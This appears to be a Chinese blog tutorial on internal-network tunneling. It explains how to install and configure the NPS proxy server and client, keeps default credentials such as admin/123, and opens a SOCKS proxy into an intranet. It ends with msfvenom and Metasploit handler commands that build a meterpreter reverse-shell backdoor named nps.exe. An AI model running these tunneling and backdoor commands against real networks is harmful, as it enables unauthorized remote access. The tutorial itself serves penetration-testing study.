# 原创
：  【内网安全-隧道搭建】内网穿透_Nps配置、上线

# 【内网安全-隧道搭建】内网穿透_Nps配置、上线

**目录**

[Nps（自定义上线）](#Nps%EF%BC%88%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%8A%E7%BA%BF%EF%BC%89)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、工具的配置：](#2%E3%80%81%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%EF%BC%9A)

[ 1、准备：](#%C2%A01%E3%80%81%E5%87%86%E5%A4%87%EF%BC%9A)

[2、服务端配置：](#2%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%85%8D%E7%BD%AE%EF%BC%9A)

[3、客户端配置](#3%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE)

[3、工具的使用：](#3%E3%80%81%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%9A)

[1、web管理界面](#1%E3%80%81web%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2)

[2、客户端上线](#2%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8A%E7%BA%BF)

[ 3、msf后门](#%C2%A03%E3%80%81msf%E5%90%8E%E9%97%A8)

---


## Nps（自定义上线）

> 
<h3>1、简述：</h3>
1）nps：是一款轻量级、高性能、功能强大的内网穿透代理服务器
<hr/>
2）功能：目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。
<hr/>
3）优点：与Frp类似，但是具有图形化管理界面，更方便配置
<hr/>
4）工具：
client代表客户端：放到内网主机
server代表服务端：放到公网服务器上
（根据内网主机下载）
 [Releases · ehang-io/nps (github.com)<img alt="icon-default.png?t=N0U7" src="https://csdnimg.cn/release/blog_editor_html/release2.2.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N0U7"/>https://github.com/ehang-io/nps/releases/](https://github.com/ehang-io/nps/releases/)<img alt="" height="981" src="https://img-blog.csdnimg.cn/9c7c913055bb479bba42702fabbc91b5.png" width="1200"/>
 注：
错误情况
需要登陆GitHub后，才能下载
如果下载过慢，使用加速器，然后上传到服务器
（有白嫖的加速器）

 <img alt="" height="231" src="https://img-blog.csdnimg.cn/1e98cc237d8c4e84872c3f2bd8bc0317.png" width="735"/>
 


---


---


---


### 2、工具的配置：

> 
<h4> 1、准备：</h4>
1）公网服务器
2）内网主机
3）工具下载
如果不知道自己虚拟机是何种框架的
直接在虚拟机设置中查看CD/DVD名称（在名称未改情况下）
4）实验环境
内网Linux-amd-64
服务器centos7
（所以我服务器、客户端就都下的Linux-amd-64）


登陆GitHub+加速器
下载完成 <img alt="" height="231" src="https://img-blog.csdnimg.cn/6e51f742dca845f6a009cf08d3367b6f.png" width="735"/>


> 
<h4>2、服务端配置：</h4>
1）上传服务端文件到服务器

我是解压之后上传的
选中文件，右键传输

<hr/>
2）安装Nps
进入到文件夹（使用Xshell）
<pre>`cd /linux_amd64_server`</pre>



<pre><code>先给nps权限
sudo chmod 777 nps
（不然会报错：被拒绝）</code></pre>
<pre><code>./nps install     #linux
nps.exe install   #windows</code></pre>
 <img alt="" height="241" src="https://img-blog.csdnimg.cn/eddda7ec84ca4d1e8ad74d5c7d9415a4.png" width="758"/>

<hr/>
3）修改配置文件
conf---&gt;nps.conf


<pre>`vim nps.conf`</pre>

<hr/>
修改的地方：
web的host、账号、密码和端口号
注意：
修改域名代理的端口，避免端口冲突
NPS的web页面默认端口8080，默认账号密码：admin/123
NPS的服务端和客户端进行连接的默认端口是8024（可修改，连接时使用修改后的端口）
NPS服务端开启的端口(即需要访问的VPS的端口)不在配置文件中，在web界面中进行配置
<pre><code>按i进行编辑
（Linux知识点）</code></pre>
<pre><code>appname = nps

#HTTP(S) proxy port, no startup if empty
http_proxy_ip=0.0.0.0
http_proxy_port=80          #域名代理http代理监听端口(修改端口，避免冲突)
https_proxy_port=443        #域名代理https代理监听端口(修改端口，避免冲突)
https_just_proxy=true
#default https certificate setting
https_default_cert_file=conf/server.pem
https_default_key_file=conf/server.key

##bridge
bridge_type=tcp            #客户端与服务端连接的协议
bridge_port=8024           #服务端客户端通信端口（即客户端访问服务端的端口）
bridge_ip=0.0.0.0

# Public password, which clients can use to connect to the server
public_vkey=123        #客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式

#Traffic data persistence interval(minute)
#Ignorance means no persistence
#flow_store_interval=1

log_level=7                 #日志输出级别
#log_path=nps.log

#Whether to restrict IP access, true or false or ignore
#ip_limit=true              #是否限制ip访问，true或false或忽略

#p2p
#p2p_ip=127.0.0.1           #服务端IP，使用p2p模式必填
#p2p_port=6000              #p2p模式开启的udp端口

#web
web_host=a.o.com            #需要修改，改为服务器ip
web_username=admin          #web界面管理账号（可修改）
web_password=123            #web界面管理密码（可修改）
web_port = 8080             #web管理端口，访问该端口可以访问NPS后台（可修改）
web_ip=0.0.0.0
web_base_url=               #web管理主路径,用于将web管理置于代理子路径后面
web_open_ssl=false
web_cert_file=conf/server.pem
web_key_file=conf/server.key
# if web under proxy use sub path. like http://host/nps need this.
#web_base_url=/nps

#Web API unauthenticated IP address(the len of auth_crypt_key must be 16)
#Remove comments if needed
#auth_key=test                          #web api密钥
auth_crypt_key =1234567812345678        #获取服务端authKey时的aes加密密钥，16位

#allow_ports=9001-9009,10001,11000-12000

#Web management multi-user login
allow_user_login=false
allow_user_register=false
allow_user_change_username=false


#extension
allow_flow_limit=false
allow_rate_limit=false
allow_tunnel_num_limit=false
allow_local_proxy=false
allow_connection_num_limit=false
allow_multi_ip=false
system_info_display=false

#cache
http_cache=false
http_cache_length=100

#get origin ip
http_add_origin_header=false

#pprof debug options
#pprof_ip=0.0.0.0               #debug pprof 服务端IP
#pprof_port=9999                #debug pprof 端口

#client disconnect timeout
disconnect_timeout=60            #客户端连接超时，单位5s，默认值60（5mins）</code></pre>
<hr/>
改完以后
按Esc
再输入:wq+回车

<hr/>
4）启动Nps：
<pre>`nps start`</pre>

<hr/>
注意：
问题一：
当启动连接失败的时候
<pre><code>输入：
nps
（会有报错信息）</code></pre>



8024端口被使用了，换一个端口，再重载配置文件，再启动
<pre><code>重载配置文件
./nps reload</code></pre>
失败了

<hr/>
问题二：
在客户端发现连接不上，应该是防火墙问题了

<hr/>
5）后台管理界面可以启动
输入ip:port

 


---


---


---


---


 

 

> 
<h4>3、客户端配置</h4>
1）下贼合适内网主机版本的
我直接复制、粘贴到内网主机了

<hr/>
2）端口是否能连接
<pre><code>Linux：./npc -server=ip:port -vkey=服务端的验证密钥
Windows：npc.exe -server=ip:port -vkey=服务端的验证密钥</code></pre>
客户端并还没有生成，这里测试端口是否能连接上
8024端口可以连通，没拒绝访问
（注：客户端未生成，服务端的验证密钥也是没有的）

 拒绝就查看配置文件是否设置的一致，服务器端口是否打开
<hr/>
3）修改配置文件

如果修改过，主要是这3个修改




---


---


---


### 3、工具的使用：

> 
<h4>1、web管理界面</h4>
1）登陆nps后台
账号密码admin/123
(如果修改了的，使用自己修改的登陆)
换为中文，嘿嘿嘿

<hr/>
2）新建一个客户端
会生成唯一验证密钥，通过密钥将NPS的服务端和客户端连接起来


得到ID、唯一验证密钥<img alt="" height="719" src="https://img-blog.csdnimg.cn/7628e3551a734c779b5d728a51e138b6.png" width="1002"/>
<hr/>
3）新增SOCKS代理
填上id、端口
服务端端口8024不能填，因为8024是连接客户端与服务端
我们需要重新写一个端口，访问服务端的这个端口，从而访问到内网




---


> 
<h4>2、客户端上线</h4>
1）连接服务端，上线
<pre><code>Linux：./npc -server=ip:port -vkey=后台服务端生成的验证密钥
Windows：npc.exe -server=ip:port -vkey=后台服务端生成的验证密钥</code></pre>

 再次查看服务端后台
已经上线了，实验基本上完成了


2）访问内网主机
使用浏览器设置代理，然后访问内网主机



> 
<h4> 3、msf后门</h4>
生成后门：
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=…… lport=3333 -f exe -o nps.exe
（注意是生成win、还是Linux的监听器）</code></pre>
（注：lhos：服务器ip、lport：服务器端口）
监听后门：
<pre><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
（注意是win、还是Linux的监听器）</code></pre>
（注：这个监听端口lport，与本地转发端口一致）


